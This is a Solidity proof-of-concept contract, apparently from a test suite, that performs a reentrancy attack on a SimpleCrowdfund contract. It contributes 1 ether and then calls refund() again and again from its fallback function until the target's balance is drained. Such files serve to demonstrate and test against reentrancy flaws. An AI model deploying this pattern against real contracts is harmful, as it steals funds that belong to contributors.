//SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import {SimpleCrowdfund} from "../../src/SimpleCrowdfund.sol";

contract AttackersContract {
    SimpleCrowdfund public simplecrowdfund;

    constructor(address _address) {
        simplecrowdfund = SimpleCrowdfund(payable(_address));
    }

    fallback() external payable {
        if (address(simplecrowdfund).balance >= 1 ether) {
            simplecrowdfund.refund();
        }
    }

    function PreperationAttack() public {
        simplecrowdfund.contribute{value: 1 ether}();
    }

    function StartAttack() public {
        require(address(this).balance >= 1 ether, "Not enought eth");
        simplecrowdfund.refund();
    }
}
